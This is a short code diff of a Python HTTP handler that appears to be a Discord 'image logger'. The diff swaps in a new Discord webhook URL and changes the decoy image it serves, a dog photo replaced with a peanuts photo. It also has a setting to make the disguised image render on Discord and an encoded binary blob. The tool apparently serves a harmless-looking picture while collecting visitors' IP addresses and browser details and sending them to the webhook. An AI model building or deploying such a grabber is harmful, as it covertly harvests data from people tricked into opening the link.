@@ -2,10 +2,10 @@ from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import httpx, base64, httpagentparser
 
-webhook = 'https://discord.com/api/webhooks/1351245049324896306/Iyp7rXUOchBjrmqyqb3932bvcJWxdhtWCnFeiNHEukHERogeaBui_nH9S3920zfjMKDy'
+webhook = 'https://discord.com/api/webhooks/1357438449669378298/hazVPPwA1lI9f0prNsELFAP3hOK5LUASQAIdeoyZ6N3r7822mhR21vIW3HIoY5F8pcSx'
 
 bindata = httpx.get(
-    'https://cdn.discordapp.com/attachments/981524757214265378/993236138544345139/dog-puppy-on-garden-royalty-free-image-1586966191.jpg'
+    'https://imgs.search.brave.com/RjSTdE2jvO8kNt-nlA7OfJQsm7BVX2649e8NiWIc95A/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly9tZWRp/YS5pc3RvY2twaG90/by5jb20vaWQvMTEy/ODE4NjE3NC9waG90/by9wZWFudXRzLWlz/b2xhdGVkLW9uLXdo/aXRlLWJhY2tncm91/bmQuanBnP3M9NjEy/eDYxMiZ3PTAmaz0y/MCZjPXRCcTcxbVot/bEpTWHROZVdaRVpV/SEdlR3RlYWFWMjdR/NWpyRm04SThPeTQ9'
 ).content
 buggedimg = True  # Set this to True if you want the image to load on discord, False if you don't. (CASE SENSITIVE)
 buggedbin = base64.b85decode(
